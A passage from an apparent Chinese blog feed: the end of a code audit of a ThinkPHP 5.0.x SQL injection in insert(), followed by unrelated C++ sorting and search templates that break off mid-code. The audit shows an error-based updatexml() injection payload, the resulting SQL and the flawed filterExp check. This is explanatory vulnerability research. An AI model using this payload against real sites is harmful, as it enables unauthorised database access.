class="cm-operator">&amp;&amp;</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">query</span><span class="cm-operator">-&gt;</span><span class="cm-variable">isBind</span>(<span class="cm-builtin">substr</span>(<span class="cm-variable-2">$val</span>, <span class="cm-number">1</span>))) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">44</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$val</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">45</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">else</span> {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">46</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$key</span> <span class="cm-operator">=</span> <span class="cm-builtin">str_replace</span>(<span class="cm-string">'.'</span>, <span class="cm-string">'_'</span>, <span class="cm-variable-2">$key</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">47</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">query</span><span class="cm-operator">-&gt;</span><span class="cm-variable">bind</span>(<span class="cm-string">'data__'</span> . <span class="cm-variable-2">$key</span>, <span class="cm-variable-2">$val</span>, <span class="cm-keyword">isset</span>(<span class="cm-variable-2">$bind</span>[<span class="cm-variable-2">$key</span>]) <span class="cm-operator">?</span> <span class="cm-variable-2">$bind</span>[<span class="cm-variable-2">$key</span>] : <span class="cm-variable">PDO</span>::<span class="cm-variable">PARAM_STR</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">48</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-string">':data__'</span> . <span class="cm-variable-2">$key</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">49</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">50</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">51</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">52</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable-2">$result</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">53</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1187px;"></div><div class="CodeMirror-gutters" style="height: 1187px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p><span>首先执行了一个</span><code>$bind = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);</code><span>这个函数的具体流程还不清楚</span></p><p><span>但是返回的值是这样的</span><code>Array (    [id] =&gt; 1    [username] =&gt; 2    [password] =&gt; 2 )</code></p><p><span>暂且可以理解为是以数组的形式返回数据库的字段名(90%的确定!)</span></p><p><span>接着就是</span><code>$fields = array_keys($bind);</code><span>将$bind数组的键以一个新的数组赋值到$fields</span></p><h3 id='4-foreach生成sql语句'><span>4. foreach()生成sql语句</span></h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587324239-15ad0a71-8ec0-410b-a600-3899a308c822.png" referrerpolicy="no-referrer" alt="图片.png"></p><p><span>此时键值$key是username $val是一个数组在图中已经给出来了</span></p><p><span>而$item在parseKey解析后值是变为</span><span>`</span><span>username</span><span>`</span></p><p><span>下面的if由于不是对象直接跳过,直接运行到</span></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587378450-963c32a2-e59a-4017-b7d9-0f58adbffe19.png" referrerpolicy="no-referrer" alt="图片.png"></p><p><span>此时$val[0]的值是inc直接跳到case inc:执行下面的语句</span></p><p><span>通过拼接</span><code>$result[$item]=updatexml(1,concat(0x7,user(),0x7e),1)+1</code></p><p><span>而reuslt的数组的值就是</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Array</span> ( [<span class="cm-variable">`username`</span>] <span class="cm-operator">=&gt;</span> <span class="cm-variable">updatexml</span>(<span class="cm-number">1</span>,<span class="cm-variable">concat</span>(<span class="cm-number">0x7</span>,<span class="cm-variable">user</span>(),<span class="cm-number">0x7e</span>),<span class="cm-number">1</span>)<span class="cm-operator">+</span><span class="cm-number">1</span> ) </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 22px;"></div><div class="CodeMirror-gutters" style="height: 22px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>返回result数组到insert()函数</span></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587425904-f1872ee2-e34d-4204-ae67-349b1bbd833b.png" referrerpolicy="no-referrer" alt="图片.png"></p><p><span>初始定义</span><code>protected $insertSql = &#39;%INSERT% INTO %TABLE% (%FIELD%) VALUES (%DATA%) %COMMENT%&#39;;</code></p><p><span>经过解析后变为sql语句变为</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="sql"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="sql"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">INSERT</span> <span class="cm-keyword">INTO</span> <span class="cm-variable-2">`users`</span> <span class="cm-bracket">(</span><span class="cm-variable-2">`username`</span><span class="cm-bracket">)</span> <span class="cm-keyword">VALUES</span> <span class="cm-bracket">(</span>updatexml<span class="cm-bracket">(</span><span class="cm-number">1</span><span class="cm-punctuation">,</span>concat<span class="cm-bracket">(</span><span class="cm-number">0x7</span><span class="cm-punctuation">,</span><span class="cm-keyword">user</span><span class="cm-bracket">()</span><span class="cm-punctuation">,</span><span class="cm-number">0x7e</span><span class="cm-bracket">)</span><span class="cm-punctuation">,</span><span class="cm-number">1</span><span class="cm-bracket">)</span><span class="cm-operator">+</span><span class="cm-number">123456</span><span class="cm-bracket">)</span> </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 22px;"></div><div class="CodeMirror-gutters" style="height: 22px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/22602434/1637587444264-8982234a-14ec-4f6f-889f-821c233fea94.png" referrerpolicy="no-referrer" alt="图片.png"></p><p><span>由于在红线的地方执行sql语句的时候由于updatexml而产生报错</span></p><h2 id='补充'><span>补充</span></h2><ol start='' ><li><p><span>这里漏洞的第一参数name[0]可以修改为dec可以 但是exp我复现失败了 后面回补充完整!</span></p></li><li><p><span>第一次审计TP框架,可能审计的不够完美,希望大家多多包涵!</span></p></li><li><p><span>本文参考七月火师傅的博客</span></p><p><a href='&quot;https://mochazz.github.io/2018/04/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%20ThinkPHP%205.0.x%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E2%BC%8A/#ThinkPHP%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86&quot;'><span>1. 代码审计 | ThinkPHP5.0.x框架SQL注⼊-七月火师傅</span></a></p><p><a href='https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b'><span>2. 官方漏洞修复</span></a></p></li><li><p><span>后来发现如果name[0]=exp 经过处理之后值</span></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122233302725.png" alt="image-20211122233302725"  /></p><p><span>$val[0]=&#39;exp &#39;所以没有匹配到,但是inc和dec却没有加一个trim,所以跟进了一下</span></p><p><span>在这里打了一下dump($val[0]);值是</span><code>string &#39;exp &#39; (length=4)</code></p><p><span>我在这里一个一个尝试了一下 最后发现</span></p><p><span>在入口函数</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">index</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$name</span> <span class="cm-operator">=</span> <span class="cm-variable">input</span>(<span class="cm-string">"get.name/a"</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">dump</span>(<span class="cm-variable-2">$name</span>[<span class="cm-number">0</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">Db</span>::<span class="cm-variable">table</span>(<span class="cm-string">"users"</span>)<span class="cm-operator">-&gt;</span><span class="cm-variable">where</span>([<span class="cm-string">"id"</span><span class="cm-operator">=&gt;</span><span class="cm-number">1</span>])<span class="cm-operator">-&gt;</span><span class="cm-variable">insert</span>([<span class="cm-string">"username"</span><span class="cm-operator">=&gt;</span><span class="cm-variable-2">$name</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-string">"ThinkPHP SQL Test."</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 157px;"></div><div class="CodeMirror-gutters" style="height: 157px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>这里打出$name[0],如果传的是exp就多了一个空格,如果是inc就没有添加空格</span></p><p><span>最后在这个目录下发现了一个函数 日!</span></p><p><code>\thinkphp\library\think\Request.php</code></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>8</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">filterExp</span>(<span class="cm-operator">&amp;</span><span class="cm-variable-2">$value</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 过滤查询特殊字符</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-builtin">is_string</span>(<span class="cm-variable-2">$value</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-builtin">preg_match</span>(<span class="cm-string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>, <span class="cm-variable-2">$value</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$value</span> .<span class="cm-operator">=</span> <span class="cm-string">' '</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// TODO 其他安全过滤</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 202px;"></div><div class="CodeMirror-gutters" style="height: 202px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>G!</span></p><p>&nbsp;</p></li></ol><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p></div></div></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一些C++小记</title>
      <link href="/2023/03/22/c++/"/>
      <url>/2023/03/22/c++/</url>
      
        <content type="html"><![CDATA[<h1 id="一-排序模板"><a href="#一-排序模板" class="headerlink" title="一 排序模板"></a>一 排序模板</h1><h2 id="1-直接插入排序"><a href="#1-直接插入排序" class="headerlink" title="1. 直接插入排序"></a>1. 直接插入排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span><span class="params">(T arr[],<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">T temp;    <span class="comment">// 临时存放T类型变量</span></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">temp = arr[i];</span><br><span class="line"><span class="keyword">while</span> (arr[j] &lt; temp &amp;&amp; j &lt; i) &#123;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = i; k &gt;= j; k--) &#123;</span><br><span class="line">arr[k] = arr[k<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = temp;</span><br><span class="line"><span class="built_in">output</span>(arr,n );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-直接选择排序"><a href="#2-直接选择排序" class="headerlink" title="2. 直接选择排序"></a>2. 直接选择排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">selectionSort</span><span class="params">(T arr[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++) &#123;</span><br><span class="line"><span class="type">int</span> minIndex = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &lt; arr[minIndex]) &#123;</span><br><span class="line">minIndex = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">T temp = arr[minIndex];</span><br><span class="line">arr[minIndex] = arr[i];</span><br><span class="line">arr[i] = temp;</span><br><span class="line"><span class="built_in">output</span>(arr, n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-气泡排序"><a href="#3-气泡排序" class="headerlink" title="3. 气泡排序"></a>3. 气泡排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(T *a,T *b)</span> </span>&#123;</span><br><span class="line">T temp = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubbleSort</span><span class="params">(T arr[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n <span class="number">-1</span> - i; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line"><span class="built_in">swap</span>(&amp;arr[j], &amp;arr[j + <span class="number">1</span>]);</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">output</span>(arr, n);</span><br><span class="line"><span class="keyword">if</span> (!flag) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二-查找模板"><a href="#二-查找模板" class="headerlink" title="二 查找模板"></a>二 查找模板</h1><h2 id="1-顺序查找"><a href="#1-顺序查找" class="headerlink" title="1. 顺序查找"></a>1. 顺序查找</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">seqSearch</span><span class="params">(<span 